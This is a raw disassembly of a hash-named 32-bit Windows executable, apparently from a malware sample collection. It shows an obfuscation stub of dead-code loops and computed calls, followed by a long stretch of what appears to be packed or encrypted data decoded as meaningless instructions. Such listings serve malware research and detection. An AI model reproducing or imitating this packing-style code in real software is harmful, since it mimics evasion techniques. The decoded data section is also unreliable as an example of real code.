
0e6de178d605028fd6b155a3522d6178a87bae8a696fb003e8e5b1f71a227948.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a3e2,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a3b6,0x13
  401024:	cmp    DWORD PTR ds:0x42a3b6,0x0
  40102b:	je     0x401065
  401031:	cmp    DWORD PTR ds:0x42a3b6,0x23
  401038:	ja     0x401065
  40103e:	jmp    0x401053
  401043:	push   0x42a3da
  401048:	push   0x4291e3
  40104d:	call   DWORD PTR ds:0x42a542
  401053:	mov    ecx,DWORD PTR ds:0x42a3b6
  401059:	dec    ecx
  40105a:	mov    DWORD PTR ds:0x42a3b6,ecx
  401060:	jmp    0x401024
  401065:	push   edi
  401066:	and    DWORD PTR ds:0x42a406,0x0
  401070:	mov    esi,DWORD PTR ds:0x42a406
  401076:	inc    esi
  401077:	mov    DWORD PTR ds:0x42a406,esi
  40107d:	cmp    DWORD PTR ds:0x42a406,0x4
  401084:	jg     0x4010ce
  40108a:	jmp    0x4010a5
  40108f:	push   0x5221
  401094:	push   0x42a41e
  401099:	push   DWORD PTR [ebp-0x10]
  40109c:	push   DWORD PTR [ebp-0x14]
  40109f:	call   DWORD PTR ds:0x42a546
  4010a5:	cmp    DWORD PTR ds:0x42a406,0x3
  4010ac:	jne    0x4010c1
  4010b2:	xor    esi,esi
  4010b4:	or     esi,DWORD PTR ds:0x42a406
  4010ba:	inc    esi
  4010bb:	mov    DWORD PTR ds:0x42a406,esi
  4010c1:	cmp    DWORD PTR ds:0x42a406,0x15
  4010c8:	jb     0x401070
  4010ce:	mov    esi,0x75108a8
  4010d3:	mov    ecx,DWORD PTR ds:0x42a4c6
  4010d9:	mov    ecx,DWORD PTR [ecx]
  4010db:	add    DWORD PTR ds:0x42a3a6,ecx
  4010e1:	xor    eax,esi
  4010e3:	and    DWORD PTR ds:0x42a3d6,0x0
  4010ed:	mov    ecx,DWORD PTR ds:0x42a3d6
  4010f3:	inc    ecx
  4010f4:	mov    DWORD PTR ds:0x42a3d6,ecx
  4010fa:	cmp    DWORD PTR ds:0x42a3d6,0x1f
  401101:	jge    0x40112c
  401107:	jmp    0x40111f
  40110c:	push   DWORD PTR [ebp-0xc]
  40110f:	push   0x429231
  401114:	push   0x42916d
  401119:	call   DWORD PTR ds:0x42a506
  40111f:	cmp    DWORD PTR ds:0x42a3d6,0x1e
  401126:	jb     0x4010ed
  40112c:	mov    edi,0x3272ef
  401131:	add    eax,edi
  401133:	and    DWORD PTR ds:0x42a3e2,0x0
  40113d:	jmp    0x401151
  401142:	xor    ecx,ecx
  401144:	xor    ecx,DWORD PTR ds:0x42a3e2
  40114a:	inc    ecx
  40114b:	mov    DWORD PTR ds:0x42a3e2,ecx
  401151:	cmp    DWORD PTR ds:0x42a3e2,0x1e
  401158:	jae    0x40119f
  40115e:	cmp    DWORD PTR ds:0x42a3e2,0xe
  401165:	ja     0x40119f
  40116b:	jmp    0x40117e
  401170:	push   0x42916d
  401175:	push   DWORD PTR [ebp-0x18]
  401178:	call   DWORD PTR ds:0x42a50a
  40117e:	cmp    DWORD PTR ds:0x42a3e2,0xd
  401185:	jne    0x40119a
  40118b:	xor    ecx,ecx
  40118d:	or     ecx,DWORD PTR ds:0x42a3e2
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a3e2,ecx
  40119a:	jmp    0x401142
  40119f:	mov    DWORD PTR [ebp-0x40],eax
  4011a2:	mov    eax,ds:0x42a41a
  4011a7:	sbb    DWORD PTR ds:0x42a3aa,eax
  4011ad:	mov    eax,ds:0x42929e
  4011b2:	sub    DWORD PTR ds:0x42a44a,ecx
  4011b8:	mov    eax,DWORD PTR [eax]
  4011ba:	mov    DWORD PTR [ebp-0x3c],eax
  4011bd:	inc    eax
  4011be:	mov    eax,ds:0x4294ae
  4011c3:	and    DWORD PTR ds:0x42a3ba,0x0
  4011cd:	jmp    0x4011df
  4011d2:	mov    ecx,DWORD PTR ds:0x42a3ba
  4011d8:	inc    ecx
  4011d9:	mov    DWORD PTR ds:0x42a3ba,ecx
  4011df:	cmp    DWORD PTR ds:0x42a3ba,0x1f
  4011e6:	jae    0x401233
  4011ec:	cmp    DWORD PTR ds:0x42a3ba,0x4
  4011f3:	jge    0x401233
  4011f9:	jmp    0x401214
  4011fe:	push   0x586f
  401203:	push   DWORD PTR [ebp-0x18]
  401206:	push   DWORD PTR [ebp-0x14]
  401209:	push   0x8d08
  40120e:	call   DWORD PTR ds:0x42a50e
  401214:	cmp    DWORD PTR ds:0x42a3ba,0x3
  40121b:	jne    0x40122e
  401221:	mov    ecx,DWORD PTR ds:0x42a3ba
  401227:	inc    ecx
  401228:	mov    DWORD PTR ds:0x42a3ba,ecx
  40122e:	jmp    0x4011d2
  401233:	mov    eax,DWORD PTR [eax]
  401235:	add    ecx,0x507d
  40123b:	mov    DWORD PTR [ebp-0x1c],eax
  40123e:	xor    ecx,0x7815
  401244:	mov    DWORD PTR [ebp-0x34],0xf89c87b9
  40124b:	or     DWORD PTR ds:0x42a42a,0x4fa4
  401255:	mov    eax,DWORD PTR [ebp-0x34]
  401258:	xor    eax,esi
  40125a:	sub    ecx,DWORD PTR ds:0x42a41e
  401260:	add    eax,edi
  401262:	and    DWORD PTR ds:0x42a3b6,edi
  401268:	mov    DWORD PTR [ebp-0x40],eax
  40126b:	mov    eax,ds:0x42941e
  401270:	mov    DWORD PTR [ebp-0x40],eax
  401273:	xor    eax,0x2e62
  401278:	mov    eax,DWORD PTR [ebp-0x3c]
  40127b:	mov    DWORD PTR [ebp-0x14],eax
  40127e:	and    DWORD PTR ds:0x42a42e,0x0
  401288:	xor    ecx,ecx
  40128a:	xor    ecx,DWORD PTR ds:0x42a42e
  401290:	inc    ecx
  401291:	mov    DWORD PTR ds:0x42a42e,ecx
  401297:	cmp    DWORD PTR ds:0x42a42e,0xb
  40129e:	ja     0x4012dc
  4012a4:	jmp    0x4012b5
  4012a9:	push   DWORD PTR [ebp-0x10]
  4012ac:	push   DWORD PTR [ebp-0x18]
  4012af:	call   DWORD PTR ds:0x42a512
  4012b5:	cmp    DWORD PTR ds:0x42a42e,0xa
  4012bc:	jne    0x4012cf
  4012c2:	mov    ecx,DWORD PTR ds:0x42a42e
  4012c8:	inc    ecx
  4012c9:	mov    DWORD PTR ds:0x42a42e,ecx
  4012cf:	cmp    DWORD PTR ds:0x42a42e,0x12
  4012d6:	jb     0x401288
  4012dc:	mov    eax,DWORD PTR [ebp-0x14]
  4012df:	adc    DWORD PTR ds:0x42a43e,edx
  4012e5:	push   0x4
  4012e7:	pop    ecx
  4012e8:	or     DWORD PTR ds:0x42a3a6,0x42a40a
  4012f2:	sub    ecx,eax
  4012f4:	and    DWORD PTR ds:0x42a3fe,edx
  4012fa:	add    ecx,DWORD PTR [ebp-0x1c]
  4012fd:	sub    DWORD PTR ds:0x42a3aa,0x29a3
  401307:	mov    DWORD PTR [ebp-0x2c],0xf89c85f9
  40130e:	adc    DWORD PTR ds:0x42a40a,0x27f4
  401318:	mov    DWORD PTR [ebp-0x18],ecx
  40131b:	xor    eax,eax
  40131d:	xor    eax,DWORD PTR ds:0x42a412
  401323:	or     DWORD PTR ds:0x42a3c6,eax
  401329:	mov    DWORD PTR [ebp-0xa0],0xf89c85bd
  401333:	mov    eax,ds:0x42a3ce
  401338:	or     DWORD PTR ds:0x42a3ca,eax
  40133e:	mov    eax,DWORD PTR [ebp-0x14]
  401341:	mov    DWORD PTR [ebp-0x9c],eax
  401347:	adc    DWORD PTR ds:0x42a3ea,ecx
  40134d:	mov    eax,DWORD PTR [ebp-0x18]
  401350:	mov    DWORD PTR [ebp-0x98],eax
  401356:	sbb    DWORD PTR ds:0x42a3da,0x5122
  401360:	mov    eax,DWORD PTR [ebp-0x2c]
  401363:	xor    eax,esi
  401365:	add    eax,edi
  401367:	or     DWORD PTR ds:0x42a3ca,0x42a43a
  401371:	mov    DWORD PTR [ebp-0x94],eax
  401377:	lea    eax,[ebp-0x48]
  40137a:	mov    DWORD PTR [ebp-0x90],eax
  401380:	mov    eax,DWORD PTR [ebp-0xa0]
  401386:	xor    eax,esi
  401388:	sbb    DWORD PTR ds:0x42a442,0x42a42a
  401392:	add    eax,edi
  401394:	or     DWORD PTR ds:0x42a43e,0x42a3a6
  40139e:	mov    DWORD PTR [ebp-0xa0],eax
  4013a4:	sub    DWORD PTR ds:0x42a3c2,0x1d49
  4013ae:	lea    eax,[ebp-0xa0]
  4013b4:	push   eax
  4013b5:	neg    eax
  4013b7:	mov    eax,DWORD PTR [ebp+0xc]
  4013ba:	sub    DWORD PTR ds:0x42a3fa,0x2c11
  4013c4:	xor    eax,esi
  4013c6:	add    eax,edi
  4013c8:	push   eax
  4013c9:	mov    eax,ds:0x42943e
  4013ce:	push   0x429394
  4013d3:	mov    DWORD PTR ds:0x42a3d6,0x524d
  4013dd:	push   DWORD PTR [eax]
  4013df:	call   0x40a946
  4013e4:	xor    edx,edx
  4013e6:	add    edx,DWORD PTR ds:0x42a3ee
  4013ec:	and    DWORD PTR ds:0x42a3de,edx
  4013f2:	mov    ebx,DWORD PTR [ebp-0x14]
  4013f5:	mov    eax,DWORD PTR [ebp-0x18]
  4013f8:	mov    DWORD PTR [ebp-0x58],eax
  4013fb:	mov    eax,ds:0x42a456
  401400:	mov    edx,DWORD PTR ds:0x42a49e
  401406:	sub    edx,eax
  401408:	sub    eax,DWORD PTR [eax+edx*1]
  40140b:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  401412:	mov    eax,0xf89c85bb
  401417:	mov    DWORD PTR [ebp-0x1c],eax
  40141a:	xor    DWORD PTR ds:0x42a3d6,0x37ec
  401424:	lea    ecx,[eax-0x2]
  401427:	and    DWORD PTR ds:0x42a432,0x0
  401431:	jmp    0x401443
  401436:	mov    edx,DWORD PTR ds:0x42a432
  40143c:	inc    edx
  40143d:	mov    DWORD PTR ds:0x42a432,edx
  401443:	cmp    DWORD PTR ds:0x42a432,0x18
  40144a:	jae    0x40382d
  401450:	cmp    DWORD PTR ds:0x42a432,0x4
  401457:	jge    0x40382d
  40145d:	jmp    0x40146b
  401462:	push   DWORD PTR [ebp-0x14]
  401465:	call   DWORD PTR ds:0x42a516
  40146b:	cmp    DWORD PTR ds:0x42a432,0x3
  401472:	jne    0x401485
  401478:	mov    edx,DWORD PTR ds:0x42a432
  40147e:	inc    edx
  40147f:	mov    DWORD PTR ds:0x42a432,edx
  401485:	jmp    0x401436
  40148a:	jmp    0x40382d
  40148f:	adc    edx,ebx
  401491:	xor    DWORD PTR [esi-0x4f],ebp
  401494:	test   DWORD PTR ds:0x31105485,eax
  40149a:	jg     0x40144f
  40149c:	ss in  al,0x6c
  40149f:	jp     0x40151b
  4014a1:	jp     0x40151d
  4014a3:	cld    
  4014a4:	pop    edi
  4014a5:	jp     0x401521
  4014a7:	and    DWORD PTR [eax],ebp
  4014a9:	daa    
  4014aa:	cmp    eax,0x2f1b3125
  4014af:	jno    0x4014e9
  4014b1:	jne    0x401529
  4014b3:	fwait
  4014b4:	jbe    0x401520
  4014b6:	push   0x69
  4014b8:	inc    edx
  4014b9:	rcr    eax,1
  4014bb:	std    
  4014bc:	ins    BYTE PTR es:[edi],dx
  4014bd:	push   esp
  4014be:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  4014c2:	jl     0x40152d
  4014c4:	gs iret 
  4014c6:	pop    ecx
  4014c7:	dec    edx
  4014c8:	cmp    al,0x88
  4014ca:	cli    
  4014cb:	xchg   edi,eax
  4014cc:	xchg   BYTE PTR [edi+0x49],ah
  4014cf:	jg     0x401518
  4014d1:	mov    WORD PTR [esi+0x3bb2bc7f],?
  4014d7:	sub    bh,bh
  4014d9:	jbe    0x4014b3
  4014db:	cli    
  4014dc:	arpl   WORD PTR [edi+0x1e],di
  4014df:	jmp    0xe9fade29
  4014e4:	xchg   edi,eax
  4014e5:	and    ebx,esi
  4014e7:	mov    esi,DWORD PTR ds:0x8aab650f
  4014ed:	rol    BYTE PTR [edi],1
  4014ef:	imul   ebx,ecx,0xfa0ee010
  4014f5:	ss and al,0x54
  4014f8:	or     BYTE PTR [esi],dh
  4014fa:	imul   esi,DWORD PTR [ebp+eax*8-0x51],0x23
  4014ff:	pop    ebp
  401500:	adc    DWORD PTR [esi+0x2b55f5ff],esi
  401506:	add    BYTE PTR [edx-0x2c],0x5b
  40150a:	add    eax,0xbd84fa1a
  40150f:	jae    0x4014ea
  401511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401512:	pop    edi
  401513:	mov    edi,DWORD PTR [ebp+0x4d922017]
  401519:	add    ebx,DWORD PTR [esi+0xb838238]
  40151f:	fisubr DWORD PTR [ecx]
  401521:	bound  ecx,QWORD PTR [ecx-0xc9fbcc0]
  401527:	iret   
  401528:	mov    dh,BYTE PTR ds:0xc8c7cc95
  40152e:	xchg   esp,eax
  40152f:	ins    DWORD PTR es:[edi],dx
  401530:	lock push ecx
  401532:	bound  ecx,QWORD PTR [eax+0x8]
  401535:	add    eax,DWORD PTR ds:[esi+0x13]
  401539:	test   eax,0x4cb7ca4b
  40153e:	fcom   QWORD PTR [eax]
  401540:	data16 stc 
  401542:	bound  esp,QWORD PTR [esi-0x4f]
  401545:	add    eax,0x5204bf74
  40154a:	adc    cl,ah
  40154c:	mov    WORD PTR [edi-0x4b],ss
  40154f:	or     edx,DWORD PTR [ebp+0x5f]
  401552:	aaa    
  401553:	add    eax,0xe9075a07
  401558:	or     al,0xdd
  40155a:	inc    ebp
  40155b:	cli    
  40155c:	out    dx,al
  40155d:	out    0x51,al
  40155f:	ja     0x401502
  401561:	daa    
  401562:	imul   ecx,DWORD PTR [edx+0x7f],0x22
  401566:	retf   
  401567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401568:	sahf   
  401569:	mov    ebp,0x34dbed0c
  40156e:	rcr    bh,0xea
  401571:	xor    esp,ebx
  401573:	mov    eax,0xc2a6b1fc
  401578:	jl     0x401594
  40157a:	test   eax,0xf708cc1
  40157f:	push   0xbf913ee5
  401584:	aam    0xb7
  401586:	rcl    BYTE PTR [ebp-0x5e],0x9b
  40158a:	sbb    BYTE PTR [esi+ecx*1-0x53],bl
  40158e:	and    eax,0xc1f8deb7
  401593:	jge    0x401521
  401595:	ins    BYTE PTR es:[edi],dx
  401596:	dec    ecx
  401597:	ja     0x40156a
  401599:	(bad)  
  40159a:	sub    BYTE PTR [ecx-0x4a],dh
  40159d:	mov    eax,es
  40159f:	inc    ebx
  4015a0:	shl    bl,cl
  4015a2:	jl     0x401569
  4015a4:	in     eax,dx
  4015a5:	rol    DWORD PTR [eax+0x40],cl
  4015a8:	dec    edi
  4015a9:	inc    edi
  4015aa:	mov    ebx,0x69b12c31
  4015af:	xchg   ebp,eax
  4015b0:	sbb    BYTE PTR ds:0x44f4,al
  4015b5:	push   esi
  4015b6:	(bad)  
  4015b7:	jmp    0x401576
  4015b9:	cmp    al,0xd8
  4015bb:	test   dh,dl
  4015bd:	xor    DWORD PTR [ecx-0x569fc68e],esi
  4015c3:	out    dx,eax
  4015c4:	out    dx,al
  4015c5:	pushf  
  4015c6:	ins    DWORD PTR es:[edi],dx
  4015c7:	or     BYTE PTR [esi+0x49],al
  4015ca:	jge    0x4015e9
  4015cc:	xchg   esp,eax
  4015cd:	mov    bh,0xd4
  4015cf:	out    0x64,al
  4015d1:	ss jmp 0xdb2afce8
  4015d7:	jle    0x40158e
  4015d9:	retf   0x7647
  4015dc:	mov    bh,0xa8
  4015de:	jle    0x4015a8
  4015e0:	mov    al,ds:0x2bb0a870
  4015e5:	fldenv [eax-0xd8954e6]
  4015eb:	fs rol bh,cl
  4015ee:	jmp    DWORD PTR [edi]
  4015f0:	inc    ebx
  4015f1:	or     DWORD PTR [ebx+edi*4+0x7d565794],0xffffffd9
  4015f9:	add    al,bl
  4015fb:	adc    BYTE PTR [ebx+0x1d],dl
  4015fe:	in     al,dx
  4015ff:	call   0xec92:0x87804fd7
  401606:	scas   al,BYTE PTR es:[edi]
  401607:	cli    
  401608:	push   cs
  401609:	aam    0xea
  40160b:	outs   dx,BYTE PTR ds:[esi]
  40160c:	jae    0x4015ce
  40160e:	cli    
  40160f:	pop    edx
  401610:	pop    esp
  401611:	mov    ?,WORD PTR [ecx-0x52d09a6f]
  401617:	adc    BYTE PTR cs:[ebx],bh
  40161a:	cmp    dl,BYTE PTR [edi+edx*8]
  40161d:	shl    BYTE PTR [edx-0x72],1
  401620:	fs das 
  401622:	xchg   ecx,eax
  401623:	cdq    
  401624:	mov    ds,WORD PTR [ebp+0x3e8dccee]
  40162a:	fdivr  QWORD PTR [eax]
  40162c:	test   al,0x7a
  40162e:	loope  0x401619
  401630:	cmp    esi,eax
  401632:	jecxz  0x40163e
  401634:	push   eax
  401635:	mov    esp,0x4159b5a7
  40163a:	sahf   
  40163b:	daa    
  40163c:	leave  
  40163d:	pop    ebp
  40163e:	add    BYTE PTR [edx],0xb4
  401641:	outs   dx,BYTE PTR ds:[esi]
  401642:	dec    ecx
  401643:	pop    esp
  401644:	ficom  DWORD PTR [edx+0x5e]
  401647:	cmp    esp,DWORD PTR [ecx+0x4089d910]
  40164d:	adc    bh,cl
  40164f:	pop    ebp
  401650:	lods   eax,DWORD PTR ds:[esi]
  401651:	ds dec edx
  401653:	cmp    ecx,DWORD PTR [ebx-0x5d]
  401656:	jns    0x401630
  401658:	inc    edx
  401659:	es and edi,esi
  40165c:	ds dec esp
  40165e:	nop
  40165f:	add    esi,DWORD PTR [edx+0x35]
  401662:	retf   
  401663:	cmp    al,0xa
  401665:	mov    cl,0x2d
  401667:	mov    al,ds:0x40ef41ac
  40166c:	stc    
  40166d:	pushf  
  40166e:	test   BYTE PTR [esi],0x9e
  401671:	push   esp
  401672:	out    dx,eax
  401673:	push   esi
  401674:	int    0xd1
  401676:	mov    al,0x4f
  401678:	push   ds
  401679:	rcl    DWORD PTR [edi+0x6e],1
  40167c:	(bad)  
  40167d:	jbe    0x4016ea
  40167f:	shl    BYTE PTR [edx+0xd],0xe7
  401683:	mov    eax,ds:0xd21cea92
  401688:	mov    ebx,0xfade1305
  40168d:	push   0x2
  40168f:	mov    edi,0x39f8a56b
  401694:	mov    cl,0x21
  401696:	mov    al,0x24
  401698:	xor    edi,eax
  40169a:	xlat   BYTE PTR ds:[ebx]
  40169b:	mov    WORD PTR [esi-0x80],fs
  40169e:	mov    cl,0x2f
  4016a0:	mov    esi,DWORD PTR [eax+0x450ba63]
  4016a6:	mov    al,0x75
  4016a8:	xor    BYTE PTR [edx-0x7a],dh
  4016ab:	mov    dh,0x44
  4016ad:	or     ebx,DWORD PTR [edi+0x1b671d9b]
  4016b3:	jp     0x401693
  4016b5:	and    BYTE PTR [ecx+0x3b],bl
  4016b8:	lock jbe 0x4016e0
  4016bb:	push   edi
  4016bc:	test   al,0x1b
  4016be:	ret    
  4016bf:	test   BYTE PTR ds:0xcddc2d67,bh
  4016c5:	(bad)  
  4016c6:	daa    
  4016c7:	add    dl,BYTE PTR [ebp-0x21d688ba]
  4016cd:	fisttp DWORD PTR [edx+0x5]
  4016d0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4016d2:	cmc    
  4016d3:	or     cl,BYTE PTR [edi+eax*2+0x5b]
  4016d7:	dec    edi
  4016d8:	stos   DWORD PTR es:[edi],eax
  4016d9:	fdivr  st,st(2)
  4016db:	call   0xbaf04b87
  4016e0:	inc    ebp
  4016e1:	jnp    0x4016fd
  4016e3:	popa   
  4016e4:	lods   eax,DWORD PTR ds:[esi]
  4016e5:	cmp    DWORD PTR [edi+0x38],ebx
  4016e8:	shl    DWORD PTR [edi+ebx*1],0x4
  4016ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ed:	gs clc 
  4016ef:	imul   ecx,DWORD PTR [edx],0x1963ef65
  4016f5:	sbb    ebx,DWORD PTR [ebx+0x64]
  4016f8:	rcr    DWORD PTR [eax-0x7d2214a7],0x3f
  4016ff:	xchg   BYTE PTR [ebx+0x37],bh
  401702:	push   edx
  401703:	adc    ecx,eax
  401705:	loop   0x40168b
  401707:	lea    eax,ds:0x65b0107a
  40170d:	jmp    0x8fd6452b
  401712:	enter  0xbac3,0xd4
  401716:	int3   
  401717:	or     bl,BYTE PTR [eax]
  401719:	mov    al,BYTE PTR [ecx-0x7f]
  40171c:	shr    BYTE PTR [esi-0x4a3c64c1],cl
  401722:	stos   DWORD PTR es:[edi],eax
  401723:	je     0x4016e3
  401725:	pop    esi
  401726:	inc    ecx
  401727:	lods   eax,DWORD PTR ds:[esi]
  401728:	inc    esi
  401729:	(bad)  
  40172b:	in     eax,dx
  40172c:	in     al,dx
  40172d:	sbb    BYTE PTR [edx-0x80],cl
  401730:	leave  
  401731:	mov    al,0x78
  401733:	add    DWORD PTR [edi-0x36],eax
  401736:	mov    ah,0xb
  401738:	dec    edx
  401739:	inc    esi
  40173a:	shl    ecx,cl
  40173c:	adc    eax,0xdb5209dd
  401741:	sub    BYTE PTR [edx-0x2d],0x7d
  401745:	xor    ebp,DWORD PTR [ecx-0x53ceb2ab]
  40174b:	push   0x1c59eaba
  401750:	dec    BYTE PTR [ebx+0x56ee6932]
  401756:	outs   dx,DWORD PTR ds:[esi]
  401757:	dec    ebp
  401758:	out    dx,al
  401759:	cmp    BYTE PTR [eax],0x1a
  40175c:	sahf   
  40175d:	out    0xa7,eax
  40175f:	and    bh,cl
  401761:	pop    ecx
  401762:	xchg   edi,eax
  401763:	sub    bl,BYTE PTR [edi+0xa]
  401766:	fadd   st(6),st
  401768:	pop    es
  401769:	fsub   DWORD PTR [ecx-0x3]
  40176c:	or     eax,0xe0dd19a2
  401771:	arpl   WORD PTR [eax+0x39],bp
  401774:	and    BYTE PTR [ebp-0x3f7ea2c8],0xb5
  40177b:	repnz mov al,gs:0xdb8ddec1
  401782:	adc    eax,0xc0cc1a9c
  401787:	push   ebp
  401788:	pop    es
  401789:	and    edi,DWORD PTR [ecx+0x3b]
  40178c:	gs cdq 
  40178e:	in     al,dx
  40178f:	mov    WORD PTR [edx+0x60],fs
  401792:	xchg   ecx,eax
  401793:	aam    0x55
  401795:	iret   
  401796:	stos   BYTE PTR es:[edi],al
  401797:	pop    esi
  401798:	xchg   ebx,eax
  401799:	push   esp
  40179a:	push   edi
  40179b:	lea    edi,[edi+ebp*2+0x9]
  40179f:	in     al,0x7
  4017a1:	(bad)  [edx]
  4017a3:	mov    ch,0x37
  4017a5:	and    al,0xcb
  4017a7:	iret   
  4017a8:	push   ebp
  4017a9:	xor    al,0x33
  4017ab:	dec    edx
  4017ac:	jp     0x4017a6
  4017ae:	mov    ecx,0x910fee2d
  4017b3:	imul   DWORD PTR [edi]
  4017b5:	dec    esp
  4017b6:	(bad)  
  4017b7:	jae    0x40175d
  4017b9:	jl     0x40176b
  4017bb:	adc    eax,0xc4b956e5
  4017c0:	aam    0x22
  4017c2:	inc    ecx
  4017c3:	stos   DWORD PTR es:[edi],eax
  4017c4:	vmwrite edi,DWORD PTR [ecx+eiz*2]
  4017c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c9:	in     al,0x9f
  4017cb:	add    al,0x6
  4017cd:	adc    DWORD PTR [edi],0xd94cbac6
  4017d3:	jl     0x4017c0
  4017d5:	sti    
  4017d6:	inc    ebp
  4017d7:	inc    ebp
  4017d8:	adc    DWORD PTR [edi+eiz*8-0x5969321c],esp
  4017df:	lods   eax,DWORD PTR ds:[esi]
  4017e0:	adc    DWORD PTR [ecx],edx
  4017e2:	arpl   ax,di
  4017e4:	sbb    eax,0xde75696a
  4017e9:	ret    0x138a
  4017ec:	sub    ah,BYTE PTR [eax]
  4017ee:	ja     0x4017d5
  4017f0:	mov    ah,0x46
  4017f2:	dec    ecx
  4017f3:	fcomip st,st(2)
  4017f5:	fsub   DWORD PTR [ebx+esi*4+0x51c8e95e]
  4017fc:	nop
  4017fd:	or     BYTE PTR [ecx+0x50],dl
  401800:	rcr    BYTE PTR ds:0x3c26df9a,1
  401806:	jg     0x40187e
  401808:	xor    BYTE PTR [edx],ch
  40180a:	push   ecx
  40180b:	ret    
  40180c:	pusha  
  40180d:	sub    BYTE PTR [esi+esi*1],dl
  401810:	push   edi
  401811:	fucomi st,st(5)
  401813:	xchg   ebx,eax
  401814:	add    BYTE PTR [edi-0xfa3c194],ah
  40181a:	or     eax,DWORD PTR [ebp+0x51]
  40181d:	mov    ch,0xf3
  40181f:	retf   
  401820:	ret    
  401821:	xor    DWORD PTR [esi+0x37],esp
  401824:	int3   
  401825:	out    dx,eax
  401826:	outs   dx,DWORD PTR ds:[esi]
  401827:	cmp    eax,0x15ae4968
  40182c:	scas   al,BYTE PTR es:[edi]
  40182d:	adc    esi,DWORD PTR [edx-0x7b]
  401830:	jle    0x4017d9
  401832:	sar    BYTE PTR [eax],1
  401834:	inc    edi
  401835:	imul   esi,DWORD PTR [ebp-0x12bdccc7],0xffffffad
  40183c:	mov    bh,0x71
  40183e:	outs   dx,DWORD PTR ds:[esi]
  40183f:	dec    eax
  401840:	test   BYTE PTR [edi+0x65456d40],cl
  401846:	xchg   edx,eax
  401847:	mov    DWORD PTR [ecx+0x22],eax
  40184a:	inc    ebp
  40184b:	mov    ah,cl
  40184d:	popf   
  40184e:	lock mov esp,0x92a69ffc
  401854:	jge    0x401858
  401856:	xchg   DWORD PTR cs:[edx-0x23c67890],edx
  40185d:	call   0xe577:0xbe0bb935
  401864:	in     al,dx
  401865:	mov    ah,0xd2
  401867:	pushf  
  401868:	retf   
  401869:	push   esp
  40186a:	xchg   ecx,eax
  40186b:	jb     0x401842
  40186d:	mov    bh,BYTE PTR [esi-0x1c1665e8]
  401873:	mov    ecx,0x7f6a84ee
  401878:	inc    esi
  401879:	xor    ah,BYTE PTR [edi]
  40187b:	leave  
  40187c:	xchg   DWORD PTR [ecx+edi*8-0x2d3cbd16],eax
  401883:	push   ds
  401884:	jmp    0x40182c
  401886:	in     al,0xe6
  401888:	xchg   ebx,eax
  401889:	jmp    0xe160f25d
  40188e:	cld    
  40188f:	aas    
  401890:	ret    0xdb9d
  401893:	push   0xdafedc88
  401898:	xchg   DWORD PTR [ebp+0x4f],esp
  40189b:	test   al,0x7e
  40189d:	push   0x116b2033
  4018a2:	icebp  
  4018a3:	xor    cl,BYTE PTR [ebp-0x54290534]
  4018a9:	enter  0x43f7,0x64
  4018ad:	mov    eax,ecx
  4018af:	js     0x40188d
  4018b1:	popa   
  4018b2:	adc    esi,DWORD PTR [eax-0x4309d219]
  4018b8:	cmp    esp,esp
  4018ba:	mov    eax,DWORD PTR [ebp-0x6d]
  4018bd:	jp     0x4018cc
  4018bf:	xor    bl,al
  4018c1:	mov    cl,0x76
  4018c3:	sub    ch,ch
  4018c5:	shl    BYTE PTR [ecx],0x21
  4018c8:	imul   ebx,DWORD PTR [ecx+0x44e0a39c],0x6e889835
  4018d2:	mov    esp,0xc98fa927
  4018d7:	scas   eax,DWORD PTR es:[edi]
  4018d8:	out    0xfa,al
  4018da:	mov    ds:0xb618d37f,eax
  4018df:	ret    
  4018e0:	inc    edx
  4018e1:	ss nop
  4018e3:	jmp    0xf129:0xaed49a03
  4018ea:	mov    ah,0x4e
  4018ec:	push   DWORD PTR [eax+0x0]
  4018ef:	pop    edx
  4018f0:	ds dec edx
  4018f2:	test   DWORD PTR [ebp-0x15],ebp
  4018f5:	fistp  QWORD PTR [ecx+0x3]
  4018f8:	mov    gs,WORD PTR [ebp+0x7af39a8e]
  4018fe:	clc    
  4018ff:	inc    ecx
  401900:	inc    ebp
  401901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401902:	in     eax,0x1d
  401904:	loope  0x401900
  401906:	ins    BYTE PTR es:[edi],dx
  401907:	fld    QWORD PTR [edx+0x6a]
  40190a:	inc    esp
  40190b:	paddw  mm2,mm4
  40190e:	fiadd  DWORD PTR cs:[ebx+0x3eec4bb4]
  401915:	xchg   ecx,eax
  401916:	dec    ecx
  401917:	shl    cl,0xce
  40191a:	popa   
  40191b:	ins    BYTE PTR es:[edi],dx
  40191c:	cli    
  40191d:	mov    eax,ds:0xfafb7491
  401922:	mov    bh,0xa6
  401924:	sbb    al,0xd0
  401926:	and    DWORD PTR [edx+0x420f8c36],esi
  40192c:	and    al,0xa7
  40192e:	xchg   ecx,eax
  40192f:	pop    edi
  401930:	es lahf 
  401932:	dec    eax
  401933:	jmp    FWORD PTR [esi]
  401935:	pop    edx
  401936:	fisub  WORD PTR [esi+ebx*1]
  401939:	les    edx,FWORD PTR ds:0xa8ff638a
  40193f:	add    DWORD PTR [esi+0xa],esp
  401942:	and    esp,edi
  401944:	mov    ds:0xb70a93b5,al
  401949:	mov    fs,ebx
  40194b:	xor    BYTE PTR [esi-0x25],0x73
  40194f:	cmp    ebp,esi
  401951:	mov    ds:0x690c873f,eax
  401956:	stos   DWORD PTR es:[edi],eax
  401957:	jmp    0x40190e
  401959:	xor    al,0xc4
  40195b:	push   0xaf7e9eaa
  401960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401961:	fucomi st,st(5)
  401963:	aam    0xe
  401965:	test   dl,bl
  401967:	jmp    0x1d4:0xde92f5e6
  40196e:	pop    ds
  40196f:	dec    ebx
  401970:	cmp    esp,DWORD PTR [ebx*4-0x4aee02f7]
  401977:	in     al,0xb
  401979:	push   edx
  40197a:	sahf   
  40197b:	iret   
